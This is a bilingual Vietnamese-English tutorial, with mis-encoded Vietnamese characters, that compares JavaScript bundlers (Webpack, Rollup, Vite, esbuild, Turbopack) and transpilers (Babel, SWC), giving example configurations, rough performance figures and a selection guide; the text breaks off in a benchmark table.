| **Config** (ƒê·ªô ph·ª©c t·∫°p c·∫•u h√¨nh) | ‚≠ê‚≠ê Ph·ª©c t·∫°p | ‚≠ê‚≠ê‚≠ê‚≠ê ƒê∆°n gi·∫£n | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê R·∫•t ƒë∆°n gi·∫£n | ‚≠ê‚≠ê‚≠ê H·∫°n ch·∫ø | ‚≠ê‚≠ê‚≠ê‚≠ê ƒê∆°n gi·∫£n |
| **Plugins** (H·ªá sinh th√°i plugin) | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Kh·ªïng l·ªì | ‚≠ê‚≠ê‚≠ê‚≠ê T·ªët | ‚≠ê‚≠ê‚≠ê‚≠ê ƒêang ph√°t tri·ªÉn | ‚≠ê‚≠ê H·∫°n ch·∫ø | ‚≠ê‚≠ê M·ªõi |
| **Bundle Size** (K√≠ch th∆∞·ªõc file ƒë√≥ng g√≥i) | ‚≠ê‚≠ê‚≠ê T·ªët | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Nh·ªè nh·∫•t | ‚≠ê‚≠ê‚≠ê‚≠ê T·ªët | ‚≠ê‚≠ê‚≠ê‚≠ê T·ªët | ‚≠ê‚≠ê‚≠ê‚≠ê T·ªët |
| **ƒê·ªô tr∆∞·ªüng th√†nh** | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê 12 nƒÉm | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê 9 nƒÉm | ‚≠ê‚≠ê‚≠ê‚≠ê 4 nƒÉm | ‚≠ê‚≠ê‚≠ê 4 nƒÉm | ‚≠ê‚≠ê 2 nƒÉm |
| **ƒê·ªô kh√≥ h·ªçc** | ‚≠ê‚≠ê Kh√≥ | ‚≠ê‚≠ê‚≠ê‚≠ê D·ªÖ | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê R·∫•t d·ªÖ | ‚≠ê‚≠ê‚≠ê‚≠ê D·ªÖ | ‚≠ê‚≠ê‚≠ê Trung b√¨nh |

---

#### **üîπ A. Webpack - "√îng Gi√† Gi√†u Kinh Nghi·ªám"**

**üí° T·ªïng Quan:**
- Bundler l√¢u ƒë·ªùi nh·∫•t, c·∫•u h√¨nh linh ho·∫°t (12 nƒÉm tu·ªïi - ra ƒë·ªùi 2012)
- H·ªá sinh th√°i plugin kh·ªïng l·ªì (h√†ng ng√†n plugins)
- Dev server ch·∫≠m, config ph·ª©c t·∫°p (c√≥ th·ªÉ 500+ d√≤ng)
- Ph√π h·ª£p nh·∫•t cho app l·ªõn, ph·ª©c t·∫°p, enterprise

**‚úÖ ƒêi·ªÉm M·∫°nh (Strengths):**
1. **Tr∆∞·ªüng Th√†nh & ·ªîn ƒê·ªãnh**: 12 nƒÉm ki·ªÉm nghi·ªám, production-ready
   - M·ªçi bugs ƒë√£ ƒë∆∞·ª£c fix qua nhi·ªÅu nƒÉm
   - H·ªó tr·ª£ m·ªçi edge cases
   - D√πng b·ªüi Facebook, Google, Microsoft

2. **H·ªá Sinh Th√°i Plugin Kh·ªïng L·ªì**: H√†ng ng√†n plugins c√≥ s·∫µn
   - Mu·ªën g√¨ c≈©ng c√≥ plugin: CSS, images, fonts, WebAssembly
   - C·ªông ƒë·ªìng l·ªõn, d·ªÖ t√¨m gi·∫£i ph√°p

3. **Code Splitting N√¢ng Cao**: Chi·∫øn l∆∞·ª£c chia nh·ªè bundle ph·ª©c t·∫°p
   - Dynamic imports: `import('./module').then(...)`
   - Split by route, vendor, common chunks
   - T·ªëi ∆∞u load time

4. **Qu·∫£n L√Ω Assets To√†n Di·ªán**: Images, fonts, CSS, m·ªçi th·ª©
   - Import ·∫£nh nh∆∞ module: `import logo from './logo.png'`
   - Optimize images, fonts t·ª± ƒë·ªông
   - CSS Modules, SASS, Less

5. **H·ªó Tr·ª£ R·ªông R√£i**: L√†m vi·ªác v·ªõi m·ªçi framework
   - React, Vue, Angular, Svelte, vanilla JS
   - C√≥ template cho t·∫•t c·∫£

**‚ùå ƒêi·ªÉm Y·∫øu (Weaknesses):**
1. **Dev Server Ch·∫≠m**: Bundle to√†n b·ªô app khi start
   - Cold start: ~10 gi√¢y (bundle h·∫øt 1000 files tr∆∞·ªõc)
   - L·∫ßn ƒë·∫ßu ch·∫°y `npm start` ‚Üí ƒë·ª£i l√¢u
   - Kh√¥ng ph√π h·ª£p cho rapid prototyping

2. **Config Ph·ª©c T·∫°p**: webpack.config.js c√≥ th·ªÉ 500+ d√≤ng
   - Loaders, plugins, optimization rules
   - Kh√≥ h·ªçc cho beginners
   - D·ªÖ config sai ‚Üí bugs kh√≥ debug

3. **HMR Ch·∫≠m**: Re-bundle l·∫°i khi thay ƒë·ªïi code
   - M·ªói l·∫ßn s·ª≠a code: 1-2 gi√¢y ƒë·ªÉ c·∫≠p nh·∫≠t
   - So v·ªõi Vite (50ms) ‚Üí c·∫£m gi√°c lag
   - Developer experience kh√¥ng t·ªët

4. **Bundle Size L·ªõn**: Nhi·ªÅu runtime code th·ª´a
   - Webpack runtime + module system
   - File output l·ªõn h∆°n Rollup ~20-30%
   - Page load ch·∫≠m h∆°n

**üìå Khi N√†o D√πng Webpack:**
- ‚úÖ **App l·ªõn c·ªßa doanh nghi·ªáp** (legacy codebases c√≥ s·∫µn)
   - ƒê√£ d√πng Webpack, kh√¥ng mu·ªën migrate
   - App ph·ª©c t·∫°p v·ªõi nhi·ªÅu requirements ƒë·∫∑c bi·ªát
   
- ‚úÖ **Build ph·ª©c t·∫°p**: C·∫ßn config chi ti·∫øt
   - Multi-page apps (MPA)
   - Custom loaders, plugins ƒë·∫∑c bi·ªát
   - Khi Vite/Rollup kh√¥ng ƒë√°p ·ª©ng ƒë∆∞·ª£c

- ‚úÖ **C·∫ßn plugin c·ª• th·ªÉ**: Plugin ch·ªâ c√≥ tr√™n Webpack
   - Module Federation (micro-frontends)
   - Specialized loaders

- ‚úÖ **Migration t·ª´ d·ª± √°n c≈©**: ƒêang d√πng Webpack r·ªìi
   - Chi ph√≠ migrate cao
   - "If it ain't broken, don't fix it"

**üîß V√≠ D·ª• Config (Webpack Configuration):**

```javascript
 // Ch√∫ gi·∫£i: webpack.config.js
const path = require('path');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');

module.exports = {
  mode: 'production', // Ch·∫ø ƒë·ªô: 'development' ho·∫∑c 'production'
  entry: './src/index.tsx', // File ƒë·∫ßu v√†o (entry point)
  
  output: {
    path: path.resolve(__dirname, 'dist'), // Ch√∫ gi·∫£i: Th∆∞ m·ª•c output
    filename: '[name].[contenthash].js', // T√™n file output v·ªõi hash (cache busting)
    clean: true, // X√≥a th∆∞ m·ª•c dist c≈© tr∆∞·ªõc khi build
  },
  
  // LOADERS - X·ª≠ l√Ω c√°c lo·∫°i file kh√°c nhau
  module: {
    rules: [
      // Rule 1: X·ª≠ l√Ω TypeScript/TSX
      {
        test: /\.(ts|tsx)$/, // Regex: file n√†o match .ts ho·∫∑c .tsx
        use: 'babel-loader', // D√πng babel-loader ƒë·ªÉ transpile
        exclude: /node_modules/, // B·ªè qua node_modules (kh√¥ng c·∫ßn transpile)
      },
      // Rule 2: X·ª≠ l√Ω CSS
      {
        test: /\.css$/, // Ch√∫ gi·∫£i: File .css
        use: [MiniCssExtractPlugin.loader, 'css-loader'], // Extract CSS ra file ri√™ng
        // Ch·∫°y t·ª´ ph·∫£i ‚Üí tr√°i: css-loader ‚Üí MiniCssExtractPlugin.loader
      },
      // Rule 3: X·ª≠ l√Ω Images
      {
        test: /\.(png|svg|jpg|jpeg|gif)$/i, // Ch√∫ gi·∫£i: File ·∫£nh
        type: 'asset/resource', // Copy ·∫£nh v√†o dist, return URL
      },
    ],
  },
  
  // PLUGINS - M·ªü r·ªông ch·ª©c nƒÉng Webpack
  plugins: [
    // Plugin 1: T·∫°o HTML file t·ª± ƒë·ªông
    new HtmlWebpackPlugin({
      template: './public/index.html', // Ch√∫ gi·∫£i: Template HTML
      // T·ª± ƒë·ªông inject <script> tag v√†o HTML
    }),
    // Plugin 2: Extract CSS ra file ri√™ng
    new MiniCssExtractPlugin({
      filename: '[name].[contenthash].css', // T√™n file CSS v·ªõi hash
    }),
  ],
  
  // OPTIMIZATION - T·ªëi ∆∞u h√≥a bundle
  optimization: {
    splitChunks: {
      chunks: 'all', // Ch√∫ gi·∫£i: Chia nh·ªè t·∫•t c·∫£ chunks
      cacheGroups: {
        // T·∫°o vendor bundle ri√™ng cho node_modules
        vendor: {
          test: /[\\/]node_modules[\\/]/, // Ch√∫ gi·∫£i: Match node_modules
          name: 'vendors', // T√™n chunk: vendors.js
          priority: 10, // ∆Øu ti√™n cao h∆°n (ch·∫°y tr∆∞·ªõc)
        },
 // Ch√∫ gi·∫£i: Result: app.js (code c·ªßa b·∫°n) + vendors.js (node_modules)
      },
    },
  },
  
  // RESOLVE - C·∫•u h√¨nh c√°ch resolve modules
  resolve: {
    extensions: ['.tsx', '.ts', '.js'], // Auto-resolve c√°c extension n√†y
    // import './App' ‚Üí t·ª± t√¨m App.tsx, App.ts, App.js
  },
};
```

**‚è±Ô∏è Hi·ªáu Su·∫•t Th·ª±c T·∫ø (Performance):**
```
Dev Server Start:  ~10 gi√¢y (cold start - l·∫ßn ƒë·∫ßu ch·∫°y)
                   - Bundle to√†n b·ªô app tr∆∞·ªõc
                   - Parse 1000+ files
                   - Transform v·ªõi Babel
                   
HMR:               ~1-2 gi√¢y (sau khi s·ª≠a code)
                   - Re-bundle ph·∫ßn thay ƒë·ªïi
                   - Inject v√†o browser
                   
Production Build:  ~10-30 gi√¢y (tu·ª≥ k√≠ch th∆∞·ªõc app)
                   - Minify, optimize, tree-shake
                   - Generate source maps
```

---

#### **üîπ B. Rollup - "Chuy√™n Gia D·ªçn R√°c Code"**

**üí° T·ªïng Quan:**
- Bundler chuy√™n v·ªÅ ESM (ES Modules) - ∆∞u ti√™n module hi·ªán ƒë·∫°i
- Tree-shaking t·ªët nh·∫•t (lo·∫°i b·ªè code kh√¥ng d√πng hi·ªáu qu·∫£ nh·∫•t)
- L√Ω t∆∞·ªüng cho libraries (React components, npm packages)
- Config ƒë∆°n gi·∫£n, t·∫≠p trung v√†o m·ª•c ƒë√≠ch

**‚úÖ ƒêi·ªÉm M·∫°nh (Strengths):**
1. **Tree-Shaking T·ªët Nh·∫•t**: Lo·∫°i b·ªè code th·ª´a c·ª±c k·ª≥ hi·ªáu qu·∫£
   - Ph√¢n t√≠ch static imports/exports
   - Ch·ªâ gi·ªØ l·∫°i code th·ª±c s·ª± ƒë∆∞·ª£c d√πng
   - Bundle size nh·ªè h∆°n Webpack 20-30%
   - Example: Import 1 function t·ª´ lodash ‚Üí ch·ªâ bundle function ƒë√≥ (kh√¥ng c·∫£ lib)

2. **Bundle Nh·ªè G·ªçn**: √çt runtime code th·ª´a
   - Kh√¥ng c√≥ Webpack runtime overhead
   - Output code g·∫ßn nh∆∞ vanilla JS
   - Perfect cho performance-critical apps

3. **ESM Native**: Sinh ra ƒë·ªÉ l√†m vi·ªác v·ªõi ES Modules
   - `import/export` syntax
   - Kh√¥ng c·∫ßn transform CJS ‚Üí ESM
   - Future-proof (ESM l√† t∆∞∆°ng lai)

4. **Config ƒê∆°n Gi·∫£n**: D·ªÖ hi·ªÉu, d·ªÖ maintain
   - √çt options h∆°n Webpack
   - Focused on core features
   - Beginners-friendly

5. **Multiple Output Formats**: Xu·∫•t ra nhi·ªÅu ƒë·ªãnh d·∫°ng
   - CJS (CommonJS) - cho Node.js
   - ESM (ES Modules) - cho browsers hi·ªán ƒë·∫°i
   - UMD (Universal Module Definition) - cho c·∫£ browser & Node
   - IIFE (Immediately Invoked Function Expression) - cho <script> tag
   - ‚Üí Perfect cho library authors

**‚ùå ƒêi·ªÉm Y·∫øu (Weaknesses):**
1. **Dev Server Ch·∫≠m**: Kh√¥ng thi·∫øt k·∫ø cho app development
   - Kh√¥ng c√≥ dev server nhanh nh∆∞ Vite
   - Ph·∫£i bundle l·∫°i to√†n b·ªô m·ªói l·∫ßn thay ƒë·ªïi
   - Kh√¥ng ph√π h·ª£p cho large apps

2. **HMR H·∫°n Ch·∫ø**: C·∫ßn th√™m plugins
   - Kh√¥ng c√≥ HMR built-in
   - Ph·∫£i c√†i `rollup-plugin-hot` ho·∫∑c d√πng v·ªõi Vite
   - DX kh√¥ng t·ªët nh∆∞ Webpack/Vite

3. **Ecosystem Nh·ªè H∆°n**: √çt plugins h∆°n Webpack
   - ~200 plugins (vs Webpack ~5000)
   - M·ªôt s·ªë use cases kh√¥ng c√≥ plugin ready
   - Ph·∫£i t·ª± vi·∫øt ho·∫∑c workaround

4. **X·ª≠ L√Ω Assets K√©m**: Kh√¥ng m·∫°nh nh∆∞ Webpack
   - Images, fonts, CSS kh√¥ng smooth
   - C·∫ßn nhi·ªÅu plugins ƒë·ªÉ x·ª≠ l√Ω assets
   - Webpack v·∫´n t·ªët h∆°n cho asset-heavy apps

**üìå Khi N√†o D√πng Rollup:**
- ‚úÖ **Ph√°t tri·ªÉn Library** (React components, npm packages)
   - Lodash, React, Vue ƒë·ªÅu d√πng Rollup
   - C·∫ßn output nh·ªè g·ªçn
   - Export nhi·ªÅu formats (CJS, ESM, UMD)
   
- ‚úÖ **App nh·ªè ƒë·∫øn trung b√¨nh**
   - Kh√¥ng c·∫ßn dev server nhanh
   - ∆Øu ti√™n bundle size nh·ªè
   
- ‚úÖ **Bundle size l√† critical**
   - Performance-sensitive apps
   - Mobile-first apps
   - Mu·ªën t·ªëi ∆∞u load time

- ‚úÖ **Publish npm package**
   - C·∫ßn tree-shakeable output
   - Support nhi·ªÅu m√¥i tr∆∞·ªùng (Node, Browser)

**üîß V√≠ D·ª• Config (Rollup Configuration):**

```javascript
 // Ch√∫ gi·∫£i: rollup.config.js
import { defineConfig } from 'rollup';
import typescript from '@rollup/plugin-typescript';
import resolve from '@rollup/plugin-node-resolve';
import commonjs from '@rollup/plugin-commonjs';
import terser from '@rollup/plugin-terser';

export default defineConfig({
  input: 'src/index.ts', // File ƒë·∫ßu v√†o
  
  // OUTPUT - Xu·∫•t ra nhi·ªÅu formats
  output: [
 // Ch√∫ gi·∫£i: Format 1: CommonJS - cho Node.js
    {
      file: 'dist/bundle.cjs.js', // Ch√∫ gi·∫£i: File output
      format: 'cjs', // Ch√∫ gi·∫£i: CommonJS: require/module.exports
      sourcemap: true, // Ch√∫ gi·∫£i: T·∫°o source map cho debugging
    },
    // Format 2: ESM - cho browsers hi·ªán ƒë·∫°i
    {
      file: 'dist/bundle.esm.js',
      format: 'esm', // Ch√∫ gi·∫£i: ES Modules: import/export
      sourcemap: true,
    },
 // Ch√∫ gi·∫£i: Format 3: UMD - universal (browser + Node)
    {
      file: 'dist/bundle.umd.js',
      format: 'umd', // Ch√∫ gi·∫£i: UMD: ch·∫°y m·ªçi n∆°i
      name: 'MyLibrary', // T√™n global variable trong browser
      sourcemap: true,
 // Ch√∫ gi·∫£i: Usage: <script src="bundle.umd.js"></script>
 // Ch√∫ gi·∫£i: window.MyLibrary.someFunction()
    },
  ],
  
  // PLUGINS - M·ªü r·ªông ch·ª©c nƒÉng
  plugins: [
    resolve(), // Ch√∫ gi·∫£i: Resolve node_modules
               // T√¨m dependencies trong node_modules
               
    commonjs(), // Ch√∫ gi·∫£i: Convert CJS ‚Üí ESM
                // V√¨ Rollup ch·ªâ hi·ªÉu ESM, ph·∫£i convert CJS packages
                
    typescript({ // Ch√∫ gi·∫£i: Compile TypeScript
      tsconfig: './tsconfig.json',
 // Ch√∫ gi·∫£i: Transpile .ts/.tsx ‚Üí .js
    }),
    
    terser(), // Ch√∫ gi·∫£i: Minify code
              // N√©n code: x√≥a whitespace, rename variables
 // Ch√∫ gi·∫£i: bundle.js (100KB) ‚Üí bundle.min.js (30KB)
  ],
  
  // EXTERNAL - Kh√¥ng bundle dependencies n√†y
  external: ['react', 'react-dom'], // Ch√∫ gi·∫£i: Peer dependencies
  // L√Ω do: Library s·∫Ω d√πng React c·ªßa app consumer
  // Kh√¥ng n√™n bundle React v√†o library ‚Üí tƒÉng size, conflict version
});
```

**‚è±Ô∏è Hi·ªáu Su·∫•t Th·ª±c T·∫ø (Performance):**
```
Production Build:  ~5 gi√¢y
                   - Nhanh h∆°n Webpack (~10-30s)
                   - Tree-shake hi·ªáu qu·∫£
                   
Bundle Size:       -30% nh·ªè h∆°n Webpack
                   - √çt runtime code
                   - Tree-shaking t·ªët h∆°n
                   
Example:
  Webpack: 150KB (minified)
  Rollup:  105KB (minified) ‚Üê Nh·ªè h∆°n 30%
```

---

#### **üîπ C. Vite - Modern, Lightning Fast**

**üí° Overview:**
- Modern dev server (ESM-based)
- Instant server start
- Lightning-fast HMR
- Rollup for production

**‚úÖ Strengths:**
1. **Instant Dev Server**: No bundling, serve ES modules directly
2. **Fast HMR**: <50ms updates
3. **Simple Config**: Minimal setup
4. **Modern Stack**: Built for modern browsers
5. **Great DX**: Out-of-the-box TypeScript, JSX, CSS

**‚ùå Weaknesses:**
1. **Modern Browsers Only**: Requires ESM support
2. **Smaller Ecosystem**: Newer than Webpack
3. **Production != Dev**: Uses Rollup for prod
4. **Large Projects**: Can slow down with 1000+ modules

**üìå Use Cases:**
- **Modern web apps** (React, Vue, Svelte)
- New projects (greenfield)
- Fast prototyping
- When DX is priority

**üîß Example Config:**

```typescript
 // Ch√∫ gi·∫£i: vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import path from 'path';

export default defineConfig({
  plugins: [react()],
  
  resolve: {
    alias: {
      '@': path.resolve(__dirname, './src'),
    },
  },
  
  build: {
    outDir: 'dist',
    sourcemap: true,
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom'],
        },
      },
    },
  },
  
  server: {
    port: 3000,
    open: true,
  },
});
```

**‚è±Ô∏è Performance:**
```
Dev Server Start:  ~500ms ‚ö° (instant!)
HMR:               ~50ms ‚ö°
Production Build:  ~2-5 seconds (Rollup)
```

**üî• Why Vite is Fast:**

```typescript
 // Ch√∫ gi·∫£i: TRADITIONAL BUNDLER (Webpack)
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ 1. Bundle ALL code                     ‚îÇ
‚îÇ    ‚îú‚îÄ node_modules (5MB)               ‚îÇ
‚îÇ    ‚îú‚îÄ src (1MB)                        ‚îÇ
‚îÇ    ‚îî‚îÄ Transform, minify, bundle        ‚îÇ
‚îÇ    ‚Üì 10 seconds                        ‚îÇ
‚îÇ 2. Start dev server                    ‚îÇ
‚îÇ 3. Serve bundle                        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

 // Ch√∫ gi·∫£i: VITE (ESM-based)
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ 1. Start dev server IMMEDIATELY ‚ö°      ‚îÇ
‚îÇ    ‚Üì 500ms                             ‚îÇ
‚îÇ 2. Browser requests /src/App.tsx       ‚îÇ
‚îÇ 3. Transform ONLY requested file       ‚îÇ
‚îÇ    ‚Üì 50ms                              ‚îÇ
‚îÇ 4. Serve ESM module                    ‚îÇ
‚îÇ                                        ‚îÇ
‚îÇ ‚úÖ Pre-bundle node_modules (esbuild)   ‚îÇ
‚îÇ ‚úÖ Transform on-demand (lazy)          ‚îÇ
‚îÇ ‚úÖ Native ESM (no bundling in dev)     ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

#### **üîπ D. esbuild - Extreme Speed (Go-based)**

**üí° Overview:**
- Written in Go (100x faster than JS)
- Extreme build speed
- Limited plugin ecosystem
- Used internally by Vite

**‚úÖ Strengths:**
1. **Blazing Fast**: 10-100x faster than Webpack
2. **Built-in**: TS, JSX, CSS, minification
3. **Simple API**: Easy to use
4. **Parallel Processing**: Multi-threaded

**‚ùå Weaknesses:**
1. **Limited Plugins**: Small ecosystem
2. **No HMR**: Not designed for dev server
3. **Basic Features**: Less advanced than Webpack
4. **Go Required**: For plugin development

**üìå Use Cases:**
- **Build step in Vite/Turbopack**
- Minification tool
- Transpiling TypeScript
- CI/CD builds (speed critical)

**üîß Example:**

```typescript
 // Ch√∫ gi·∫£i: esbuild.config.js
const esbuild = require('esbuild');

esbuild.build({
  entryPoints: ['src/index.tsx'],
  bundle: true,
  outfile: 'dist/bundle.js',
  minify: true,
  sourcemap: true,
  target: ['es2020'],
  loader: {
    '.ts': 'ts',
    '.tsx': 'tsx',
  },
  external: ['react', 'react-dom'],
}).catch(() => process.exit(1));
```

**‚è±Ô∏è Performance:**
```
Production Build:  ~500ms ‚ö°‚ö°‚ö° (10x faster than Webpack!)
Bundle Size:       Similar to Rollup
```

---

#### **üîπ E. Turbopack - Next.js Native (Rust-based)**

**üí° Overview:**
- Rust-based bundler
- Built by Vercel for Next.js
- Incremental computation
- Replaces Webpack in Next.js

**‚úÖ Strengths:**
1. **Extreme Speed**: Rust-based, 10x faster than Webpack
2. **Incremental**: Caches everything
3. **Next.js Native**: Deep integration
4. **Future-proof**: Modern architecture

**‚ùå Weaknesses:**
1. **Next.js Only**: Not standalone (yet)
2. **New**: Immature, bugs
3. **Limited Plugins**: Small ecosystem
4. **Rust Required**: For customization

**üìå Use Cases:**
- **Next.js apps** (experimental)
- Large Next.js projects
- When build speed is critical

**üîß Example:**

```javascript
 // Ch√∫ gi·∫£i: next.config.js
/** @type {import('next').NextConfig} */
const nextConfig = {
  experimental: {
    turbo: {
 // Ch√∫ gi·∫£i: Enable Turbopack
      loaders: {
        '.svg': ['@svgr/webpack'],
      },
    },
  },
};

module.exports = nextConfig;
```

**‚è±Ô∏è Performance:**
```
Dev Server (Next.js):
- Webpack:  ~10 seconds
- Turbopack: ~1 second ‚ö°‚ö°‚ö° (10x faster!)

HMR:
- Webpack:  ~1-2 seconds
- Turbopack: ~50ms ‚ö°‚ö°‚ö°
```

---

#### **2Ô∏è‚É£ TRANSPILERS COMPARISON**

**üìä Babel vs SWC:**

| Feature | **Babel** | **SWC** |
|---------|-----------|---------|
| **Speed** | ‚≠ê‚≠ê Baseline | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê 20x faster |
| **Language** | JavaScript | Rust |
| **Plugin Ecosystem** | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Huge | ‚≠ê‚≠ê‚≠ê Growing |
| **Compatibility** | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Best | ‚≠ê‚≠ê‚≠ê‚≠ê Good |
| **Preset Support** | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Many | ‚≠ê‚≠ê‚≠ê Basic |
| **Maturity** | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê 10y | ‚≠ê‚≠ê‚≠ê 4y |
| **Minification** | ‚ùå No | ‚úÖ Yes |
| **TypeScript** | ‚úÖ Via preset | ‚úÖ Built-in |

---

#### **üîπ A. Babel - The Standard**

**‚úÖ Strengths:**
1. **Plugin Ecosystem**: 1000+ plugins
2. **Presets**: @babel/preset-env, @babel/preset-react, etc.
3. **Compatibility**: Support old browsers (IE11)
4. **Customization**: Fine-grained control
5. **Stable**: Production-proven

**‚ùå Weaknesses:**
1. **Slow**: JavaScript-based (single-threaded)
2. **Complex Config**: Many presets/plugins
3. **Large**: Increases build time significantly

**üîß Example:**

```javascript
 // Ch√∫ gi·∫£i: babel.config.js
module.exports = {
  presets: [
    ['@babel/preset-env', {
      targets: '> 0.25%, not dead',
      useBuiltIns: 'usage',
      corejs: 3,
    }],
    '@babel/preset-react',
    '@babel/preset-typescript',
  ],
  plugins: [
    '@babel/plugin-proposal-class-properties',
    '@babel/plugin-proposal-optional-chaining',
  ],
};
```

---

#### **üîπ B. SWC - The Speed Demon**

**‚úÖ Strengths:**
1. **20x Faster**: Rust-based, parallel processing
2. **Built-in Minification**: No need for Terser
3. **TypeScript Native**: No extra config
4. **Compatible**: Drop-in replacement for Babel
5. **Used by**: Next.js, Vite, Turbopack

**‚ùå Weaknesses:**
1. **Smaller Ecosystem**: Fewer plugins
2. **Less Mature**: Newer, potential bugs
3. **Limited Presets**: Basic compared to Babel

**üîß Example:**

```json
 // Ch√∫ gi·∫£i: .swcrc
{
  "jsc": {
    "parser": {
      "syntax": "typescript",
      "tsx": true
    },
    "transform": {
      "react": {
        "runtime": "automatic"
      }
    },
    "target": "es2020"
  },
  "module": {
    "type": "es6"
  },
  "minify": true
}
```

**‚è±Ô∏è Performance:**
```
Transpile 1000 files:
- Babel: ~10 seconds
- SWC:   ~500ms ‚ö°‚ö°‚ö° (20x faster!)
```

---

#### **3Ô∏è‚É£ Decision Matrix - Khi N√†o D√πng G√¨?**

```typescript
 // Ch√∫ gi·∫£i: =====================================
 // Ch√∫ gi·∫£i: BUILD TOOL SELECTION GUIDE
 // Ch√∫ gi·∫£i: =====================================

const selectBuildTool = (project: Project): BuildTool => {
 // Ch√∫ gi·∫£i: 1. NEW PROJECT ‚Üí Vite
  if (project.isNew && project.framework !== 'Next.js') {
    return 'Vite'; // Ch√∫ gi·∫£i: ‚ö° Best DX, fast, modern
  }
  
 // Ch√∫ gi·∫£i: 2. NEXT.JS ‚Üí Turbopack (experimental)
  if (project.framework === 'Next.js') {
    return 'Turbopack'; // Ch√∫ gi·∫£i: üöÄ Native, fastest
  }
  
 // Ch√∫ gi·∫£i: 3. LIBRARY ‚Üí Rollup
  if (project.type === 'library') {
    return 'Rollup'; // Ch√∫ gi·∫£i: üì¶ Best tree-shaking, multiple outputs
  }
  
 // Ch√∫ gi·∫£i: 4. LEGACY/ENTERPRISE ‚Üí Webpack
  if (project.hasLegacyCode || project.complexRequirements) {
    return 'Webpack'; // Ch√∫ gi·∫£i: üèóÔ∏è Mature, configurable, plugins
  }
  
 // Ch√∫ gi·∫£i: 5. CI/CD BUILD ONLY ‚Üí esbuild
  if (project.needsSpeed && !project.needsDevServer) {
    return 'esbuild'; // Ch√∫ gi·∫£i: ‚ö°‚ö°‚ö° Fastest builds
  }
  
 // Ch√∫ gi·∫£i: Default: Vite
  return 'Vite';
};

 // Ch√∫ gi·∫£i: TRANSPILER SELECTION
const selectTranspiler = (project: Project): Transpiler => {
 // Ch√∫ gi·∫£i: 1. SPEED CRITICAL ‚Üí SWC
  if (project.prioritizeSpeed) {
    return 'SWC'; // Ch√∫ gi·∫£i: ‚ö° 20x faster
  }
  
 // Ch√∫ gi·∫£i: 2. OLD BROWSER SUPPORT ‚Üí Babel
  if (project.targets.includes('IE11')) {
    return 'Babel'; // Ch√∫ gi·∫£i: üåê Best compatibility
  }
  
 // Ch√∫ gi·∫£i: 3. COMPLEX TRANSFORMATIONS ‚Üí Babel
  if (project.needsCustomPlugins) {
    return 'Babel'; // Ch√∫ gi·∫£i: üîå Huge ecosystem
  }
  
 // Ch√∫ gi·∫£i: Default: SWC (modern projects)
  return 'SWC';
};
```

---

#### **4Ô∏è‚É£ Real-World Benchmarks**

**üèÅ Build Time Comparison (Same Project):**

```
Project: React app (500 components, 2MB source)

DEV SERVER START:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Tool         ‚îÇ Time      ‚îÇ Comparison   ‚îÇ
